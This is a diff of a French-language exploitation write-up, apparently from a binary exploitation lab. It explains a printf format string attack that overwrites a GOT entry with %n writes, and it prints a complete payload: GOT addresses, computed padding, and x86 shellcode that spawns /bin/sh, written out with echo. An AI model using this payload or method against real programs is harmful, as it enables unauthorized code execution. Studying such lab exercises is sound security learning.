@@ -34,8 +34,7 @@ On ajoute 0x20 pour obtenir l'addresse du buffer en execution normale: 0xffffd6b
 On trouve avec des %p que l'argument positionnel printf pour tomber dans le
 buffer est de 10 (et 11 pour tomber 4 octets dans le buffer).
 Notre chaine de format string attack seras donc:
-[addresse GOT][addresse GOT + 4][nombre des 2 1ers octets addr shellcode]%10$n↙
-[nombre des 2 derniers octets addr shellcode - octets deja affiches]%11$n
+> [addresse GOT][addresse GOT + 4][nombre des 2 1ers octets addr shellcode]%10$n[nombre des 2 derniers octets addr shellcode - octets deja affiches]%11$n
 
 - les addresses font 4 octets chacunes (8 octets),
 - le padding se fait avec "%12345x" les 2 fois, soit 2*7 octets (14 octets)
@@ -54,7 +53,7 @@ ecrire en memoire precisement 0xffffd6d9:
 0xffff - 0xd6d9 = 10534 en decimal
 
 Notre chaine d'attaque complete seras donc:  
-> [chaine pour la GOT override (ligne 37-38)][octet 0][shellcode][padding pour satisfaire le fgets]
+> [chaine pour la GOT override (ligne 37)][octet 0][shellcode][padding pour satisfaire le fgets]
 
 	$ [copie colle du contenu de fill_script_command]
 	$ echo -en "\xe0\x97\x04\x08\xe2\x97\x04\x08%54993x%10\$n%10534x%11\$n\x00\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"$(/tmp/fill 50) > /tmp/in
